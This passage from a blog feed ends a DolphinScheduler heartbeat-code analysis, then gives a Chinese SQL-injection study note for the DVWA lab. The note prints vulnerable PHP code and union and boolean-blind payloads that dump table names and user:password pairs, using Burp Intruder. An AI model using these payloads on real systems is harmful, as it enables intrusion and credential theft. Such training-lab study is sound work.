class="comment">//获取cpu核心数</span></span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> WORKER:</span><br><span class="line">                    <span class="type">WorkerHeartBeat</span> <span class="variable">workerHeartBeat</span> <span class="operator">=</span> JSONUtils.parseObject(heartBeatJson, WorkerHeartBeat.class);</span><br><span class="line">                    server.setCreateTime(<span class="keyword">new</span> <span class="title class_">Date</span>(workerHeartBeat.getStartupTime()));</span><br><span class="line">                    server.setLastHeartbeatTime(<span class="keyword">new</span> <span class="title class_">Date</span>(workerHeartBeat.getReportTime()));</span><br><span class="line">                    server.setId(workerHeartBeat.getProcessId());</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            server.setResInfo(heartBeatJson);</span><br><span class="line">            <span class="comment">// todo: add host, port in heartBeat Info, so that we don&#x27;t need to parse this again</span></span><br><span class="line">            server.setZkDirectory(parentPath + <span class="string">&quot;/&quot;</span> + serverPath);</span><br><span class="line">            <span class="comment">// set host and port</span></span><br><span class="line">            String[] hostAndPort = serverPath.split(COLON);</span><br><span class="line">            String[] hosts = hostAndPort[<span class="number">0</span>].split(DIVISION_STRING);</span><br><span class="line">            <span class="comment">// fetch the last one</span></span><br><span class="line">            server.setHost(hosts[hosts.length - <span class="number">1</span>]);</span><br><span class="line">            server.setPort(Integer.parseInt(hostAndPort[<span class="number">1</span>]));</span><br><span class="line">            serverList.add(server);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> serverList;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>[MasterHeartBeat</code>.java](<a href="http://masterheartbeat.java/">http://MasterHeartBeat.java</a>) master心跳</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Licensed to the Apache Software Foundation (ASF) under one or more</span></span><br><span class="line"><span class="comment"> * contributor license agreements.  See the NOTICE file distributed with</span></span><br><span class="line"><span class="comment"> * this work for additional information regarding copyright ownership.</span></span><br><span class="line"><span class="comment"> * The ASF licenses this file to You under the Apache License, Version 2.0</span></span><br><span class="line"><span class="comment"> * (the &quot;License&quot;); you may not use this file except in compliance with</span></span><br><span class="line"><span class="comment"> * the License.  You may obtain a copy of the License at</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *    http://www.apache.org/licenses/LICENSE-2.0</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Unless required by applicable law or agreed to in writing, software</span></span><br><span class="line"><span class="comment"> * distributed under the License is distributed on an &quot;AS IS&quot; BASIS,</span></span><br><span class="line"><span class="comment"> * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.</span></span><br><span class="line"><span class="comment"> * See the License for the specific language governing permissions and</span></span><br><span class="line"><span class="comment"> * limitations under the License.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> org.apache.dolphinscheduler.common.model;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> lombok.AllArgsConstructor;</span><br><span class="line"><span class="keyword">import</span> lombok.Builder;</span><br><span class="line"><span class="keyword">import</span> lombok.Data;</span><br><span class="line"><span class="keyword">import</span> lombok.NoArgsConstructor;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@Builder</span></span><br><span class="line"><span class="meta">@NoArgsConstructor</span></span><br><span class="line"><span class="meta">@AllArgsConstructor</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MasterHeartBeat</span> <span class="keyword">implements</span> <span class="title class_">HeartBeat</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">long</span> startupTime;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">long</span> reportTime;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">double</span> cpuUsage;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">double</span> memoryUsage;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">double</span> loadAverage;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">double</span> availablePhysicalMemorySize;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">double</span> maxCpuloadAvg;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">double</span> reservedMemory;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">double</span> diskAvailable;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> processId;</span><br><span class="line">    <span class="comment">// 新增核数</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> cpuCoreCount;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们进一步深入解析</p><p>到这里 <code>getHeartBeat()</code> 方法这里开始调用最关键的一步.cpuCoreCount(OSUtils.getCPUCoreCount()) 真正的获取master节点核心cup数量</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;&#92;assets&#92;css&#92;APlayer.min.css&quot;&gt;&lt;script src=&quot;&#92;assets&#92;js&#92;APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="技术" scheme="https://sfyyh.github.io/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
    <category term="dolphinscheduler" scheme="https://sfyyh.github.io/tags/dolphinscheduler/"/>
    
    <category term="大数据分析平台" scheme="https://sfyyh.github.io/tags/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90%E5%B9%B3%E5%8F%B0/"/>
    
    <category term="GitHub" scheme="https://sfyyh.github.io/tags/GitHub/"/>
    
  </entry>
  
  <entry>
    <title>渗透学习记录OS</title>
    <link href="https://sfyyh.github.io/2022/12/25/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95OS/"/>
    <id>https://sfyyh.github.io/2022/12/25/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95OS/</id>
    <published>2022-12-25T14:58:29.000Z</published>
    <updated>2023-08-04T01:05:35.055Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="mysql默认表相关知识"><a href="#mysql默认表相关知识" class="headerlink" title="mysql默认表相关知识"></a>mysql默认表相关知识</h2><p>在 mysql5 版本以后，mysql 默认在数据库中存放在一个叫 <code>infomation_schema</code> 里面 这个库里面有很多表 重点是这三个表 <code>columns 、tables、SCHEMATA</code> 表字段 CHEMA_NAME 记录着库的信息</p><p>columns 存储该用户创建的所有数据库的库名、标名和字段名。</p><h2 id="union联合注入攻击原理"><a href="#union联合注入攻击原理" class="headerlink" title="union联合注入攻击原理"></a>union联合注入攻击原理</h2><blockquote><p>步骤一：联合两表</p><p>​1.union语句要求字段数一样才可以执行，所以我们要先进行字段判断</p><p>常见方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM `users` WHERE user_id=1 order by 8</span><br></pre></td></tr></table></figure><p>判断出字段数为8</p><p>然后通过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM `users` WHERE user_id=1 union SELECT 1,2,3,4,5,6,7,8</span><br></pre></td></tr></table></figure><p>进行联合查询</p></blockquote><p>联合查询后面的语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM guestbook WHERE `comment_id`=1 union SELECT 1,2,user()</span><br></pre></td></tr></table></figure><p>select后面的数字可以替换成字段的名称或者函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-- 替换成mysql内置函数</span><br><span class="line">SELECT * FROM guestbook WHERE `comment_id`=1 union SELECT user(),md5(&#x27;a&#x27;),version()</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-- 替换成mysql数据库里的字段</span><br><span class="line">SELECT * FROM guestbook WHERE `comment_id`=1 union SELECT user_id,user,password from users</span><br><span class="line">-- 也可以在语句后面加上limit限定显示的行数</span><br><span class="line">SELECT * FROM guestbook WHERE `comment_id`=1 union SELECT user_id,user,password from users limit 1</span><br><span class="line"></span><br><span class="line">SELECT * FROM guestbook WHERE `comment_id`=1 union SELECT user_id,user,password from users limit 0,2</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-- 如果不想要第一个表里的数据 可以把1换成-1 因为默认负数就表示不存在的</span><br><span class="line">SELECT * FROM guestbook WHERE `comment_id`=-1 union SELECT user_id,user,password from users limit 1</span><br></pre></td></tr></table></figure><h2 id="union联合注入攻击分析"><a href="#union联合注入攻击分析" class="headerlink" title="union联合注入攻击分析"></a>union联合注入攻击分析</h2><h3 id="分析联合注入漏洞代码"><a href="#分析联合注入漏洞代码" class="headerlink" title="分析联合注入漏洞代码"></a>分析联合注入漏洞代码</h3><p>首先我们先分析构成联合注入攻击的sql注入代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="comment">#这里传入的参数没有进行过滤直接进入sql语句</span></span><br><span class="line">    <span class="comment">#从这里可以判断出id是字符串类型 所以在进行sql注入检测的时候要匹配字符</span></span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="subst">$id</span>&#x27;;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_connect_error</span>()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    <span class="keyword">while</span>( <span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_assoc</span>( <span class="variable">$result</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Get values</span></span><br><span class="line">        <span class="comment">//显示查询成功后的内容</span></span><br><span class="line">        <span class="variable">$first</span> = <span class="variable">$row</span>[<span class="string">&quot;first_name&quot;</span>];</span><br><span class="line">        <span class="variable">$last</span>  = <span class="variable">$row</span>[<span class="string">&quot;last_name&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;ID: <span class="subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="判断是否存在联合注入"><a href="#判断是否存在联合注入" class="headerlink" title="判断是否存在联合注入"></a>判断是否存在联合注入</h3><p>​我们先通过靶场查询id 如果在我们没进行源代码分析的基础上 我们首先需要进行数字和字符串判断 <code>1</code> 和<code>1‘</code> 判断出传入数据是字符串型 即存在注入漏洞</p><p>​输入 1’and ‘1’&#x3D;’1 页面返回用户信息 1’and ‘1’&#x3D;’2 页面返回不一样的信息。基本可以确定存在 SQL 注入漏洞.</p><h3 id="判断字段数"><a href="#判断字段数" class="headerlink" title="判断字段数"></a>判断字段数</h3><p>​使用语句<code>order by</code>确定当前表的字符数</p><p>​order by 1 如果页面返回正常 字段数不少于 1,order by 2 不少于 2，一直如此类推直到页面出错。正确的字段数是出错数字减少 1</p><p>公式 order by n-1</p><p>1’ order by 1–+ 正常</p><p>1’ order by 2–+ 正常</p><p>1’ order by 3–+ 出错</p><p>正常页面 </p><h3 id="联合查询注入获取敏感信息"><a href="#联合查询注入获取敏感信息" class="headerlink" title="联合查询注入获取敏感信息"></a>联合查询注入获取敏感信息</h3><p>​跟前面咱们分析的一样，这里只是把查询的数据替换成了联合查询的语句 然后进行获取另一个表的字段或者函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select user,password from users-- </span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/2587631/202212/2587631-20221225232138976-1882168286.png"></p><p>我们也可以使用<code>group_concat（）</code>函数来进行分组打印</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,group_concat(user(),0x3A,version())-- </span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/2587631/202212/2587631-20221225232149753-1158385166.png"></p><h3 id="联合查询注入通过information-schema"><a href="#联合查询注入通过information-schema" class="headerlink" title="联合查询注入通过information_schema"></a>联合查询注入通过information_schema</h3><p>​</p><p>在黑盒情况下我们是不知道当前数据库里都有哪些表的所以我们先从mysql的information_schema入手进行表的查询</p><p>第一个表：</p><p>这里的<code>database（）</code>函数是来限定查询的表是当前表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,(select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=database() limit 1)-- </span><br></pre></td></tr></table></figure><p>第二个表：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,(select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=database() limit 1,2)-- </span><br></pre></td></tr></table></figure><p>通过两个表的查询我们知道dvwa中含有的表为<code>guestbook</code> 和<code>users</code></p><h3 id="联合查询注入通过information-schema获取字段"><a href="#联合查询注入通过information-schema获取字段" class="headerlink" title="联合查询注入通过information_schema获取字段"></a>联合查询注入通过information_schema获取字段</h3><p>我们知道数据库的字段都存在mysql默认内置库information_schema的columns里，所以我们想要获取当前数据库的字段名字我们可以通过</p><p>获取users表里的第一个字段名字 id </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,(select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=&#x27;users&#x27; limit 1)-- </span><br><span class="line">-- 注意这里一定要加上限定 因为你每次查询都是一个字段如果不加会报错</span><br><span class="line">-- Subquery returns more than 1 row</span><br></pre></td></tr></table></figure><p>获取第二个字段名字 password </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,(select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=&#x27;users&#x27; limit 2,1)-- </span><br></pre></td></tr></table></figure><p>获取第三个字段名字  email</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,(select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=&#x27;users&#x27; limit 3,1)-- </span><br></pre></td></tr></table></figure><p>获取第四个字段名字 secret</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,(select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=&#x27;users&#x27; limit 4,1)-- </span><br></pre></td></tr></table></figure><p>………………………….</p><h3 id="通过联合查询表里面的内容"><a href="#通过联合查询表里面的内容" class="headerlink" title="通过联合查询表里面的内容"></a>通过联合查询表里面的内容</h3><p>​通过以上操作我们已经获取了当前数据库的库名、表名、字段</p><p>那么我们就可以通过下面语句获取表里面的内容了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,(select group_concat(user,0x3a,password) from users limit 1)-- </span><br></pre></td></tr></table></figure><h2 id="boolean布尔型盲注入"><a href="#boolean布尔型盲注入" class="headerlink" title="boolean布尔型盲注入"></a>boolean布尔型盲注入</h2><h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="comment">#id为字符串型 get接收id参数</span></span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    <span class="variable">$getid</span>  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="subst">$id</span>&#x27;;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$getid</span> ); <span class="comment">// Removed &#x27;or die&#x27; to suppress mysql errors</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    <span class="variable">$num</span> = @<span class="title function_ invoke__">mysqli_num_rows</span>( <span class="variable">$result</span> ); <span class="comment">// The &#x27;@&#x27; character suppresses errors</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$num</span> &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// User wasn&#x27;t found, so the page wasn&#x27;t!</span></span><br><span class="line">        <span class="title function_ invoke__">header</span>( <span class="variable">$_SERVER</span>[ <span class="string">&#x27;SERVER_PROTOCOL&#x27;</span> ] . <span class="string">&#x27; 404 Not Found&#x27;</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((<span class="title function_ invoke__">is_null</span>(<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>接收 id 的值，直接带入查询，如果存在即返回 users is exists in the database</p><p>否则显示 users id is missing 像这种只有正确与错误页面。页面不会显示数据库</p><p>里任何内容，如果存在注入，成为盲注入。</p><p>​盲注入的方法有两种：一是布尔型盲注入，二是延时注入</p><h3 id="判断盲注入"><a href="#判断盲注入" class="headerlink" title="判断盲注入"></a>判断盲注入</h3><p>​我们可以通过<code>1&#39; and &#39;1&#39;=&#39;1</code> 和 <code>1&#39; and &#39;1&#39;=&#39;2</code> 是否一样 </p><p>​以及 <code>1&#39; and sleep(10)--</code>让他睡10s判断是否一样 </p><h3 id="Boolean布尔型注入攻击"><a href="#Boolean布尔型注入攻击" class="headerlink" title="Boolean布尔型注入攻击"></a>Boolean布尔型注入攻击</h3><p>​因为页面不会返回查询的内容所以我们不能使用联合查询注入攻击，但是我们可以通过构造sql来获取数据。</p><p>​</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and if(1=1,1,0)--  -- 三目运算</span><br></pre></td></tr></table></figure><h3 id="布尔型盲注入获取数据库敏感信息"><a href="#布尔型盲注入获取数据库敏感信息" class="headerlink" title="布尔型盲注入获取数据库敏感信息"></a>布尔型盲注入获取数据库敏感信息</h3><p>​在黑盒测试环境下，通过构造sql语句来进行获取敏感信息。</p><p>构造sql语句常用的函数：</p><p>1.<code>SUBSTRING()</code>字符串截取函数，第一个参数是字符串，第二个参数开始截取，第三个参数是截取的长度</p><p>我们可以构造这样的sql语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT if(SUBSTRING(database(),1,1)=&#x27;d&#x27;,1,0)</span><br></pre></td></tr></table></figure><p>如果截取的第一个字符是‘d’我们返回1 否则返回0</p><p>此类推。再后拼接字符就是完整的库名。</p><h2 id="黑盒情况下进行布尔盲注入"><a href="#黑盒情况下进行布尔盲注入" class="headerlink" title="黑盒情况下进行布尔盲注入"></a>黑盒情况下进行布尔盲注入</h2><p>步骤：</p><p>​我们首先需要判断注入是否为布尔注入，判断完后就可以获取数据库的长度，得到长度再查询库名，然后查询表名，字段，字段内容。。。</p><h3 id="布尔盲注入查询长度"><a href="#布尔盲注入查询长度" class="headerlink" title="布尔盲注入查询长度"></a>布尔盲注入查询长度</h3><p>​通过构造如下sql语句进行数据库长度的查询</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and if(length(database())=4,1,0)-- </span><br></pre></td></tr></table></figure><p>判断出长度为4</p><h3 id="布尔盲注入判断库名"><a href="#布尔盲注入判断库名" class="headerlink" title="布尔盲注入判断库名"></a>布尔盲注入判断库名</h3><p>这一步操作其实就是通过遍历</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz.@_</span><br></pre></td></tr></table></figure><p>与语句进行整合判断出是否返回1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and if(SUBSTRING(database(),1,1)=&#x27;$d&#x27;,1,0)-- </span><br></pre></td></tr></table></figure><p>当然了，我们手动进行一个一个测试肯定很慢，那么我们可以借助burp来进行如此操作</p><p>带有构造sql语句的url</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.18.137/01/vulnerabilities/sqli_blind/?id=1%27%20and%20if(SUBSTRING(database(),1,1)=%27d%27,1,0)--%20&amp;Submit=Submit#</span><br></pre></td></tr></table></figure><p>再burp里面抓包然后送入intruder</p><p>先清除变量 然后再将数字和字母设为变量 攻击类型选择 <code>cluster bomb</code></p><p><img src="https://img2023.cnblogs.com/blog/2587631/202212/2587631-20221225232208426-323266936.png"></p><p>然后就是payloads里面两个变量的设置 然后开始攻击就行 跑出来的状态码为200即为成功！</p><p>获得的数据库名为 dvwa</p><p>接着我们通过库名来获取表名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and if(SUBSTRING((select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=database() limit 1),1,1)=&#x27;g&#x27;,1,0)-- </span><br></pre></td></tr></table></figure><p>同样通过burp进行抓包</p><p><img src="https://img2023.cnblogs.com/blog/2587631/202212/2587631-20221225232216969-1395888437.png"></p><p>获取到表名guestbook</p><p>然后获取字段名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and if(SUBSTRING((select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=&#x27;users&#x27; limit 1,1),1,1)=&#x27;l&#x27;,1,0)-- </span><br></pre></td></tr></table></figure><p>同样我们用burp进行爆破</p><p><img src="https://img2023.cnblogs.com/blog/2587631/202212/2587631-20221225232228021-2082015114.png"></p><p>得到字段名为<code>login  password</code>等<img src="https://img2023.cnblogs.com/blog/2587631/202212/2587631-20221225232302275-1126861267.png"></p><p>获得完</p><p>字段后 我们可以进一步获取字段内容【账号+密码】</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and if(SUBSTRING((select CONCAT(user,0x3a,PASSWORD) from users limit 1),1,1)=&#x27;a&#x27;,1,0)-- </span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/2587631/202212/2587631-20221225232253962-1018686498.png"></p><h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>​顾名思义报错注入就是指数据库显示错误，比如sql语法错误</p><p>一般对于php。特别php 在执行 SQL 语句时一般都会采用异常处理函数，捕获错误信息。在 php 中 使用 <code>mysql_error()</code>函数</p><p>​如果在查询注入时候会有报错信息返回，可以采用报错注入</p><h3 id="报错注入分析"><a href="#报错注入分析" class="headerlink" title="报错注入分析"></a>报错注入分析</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td 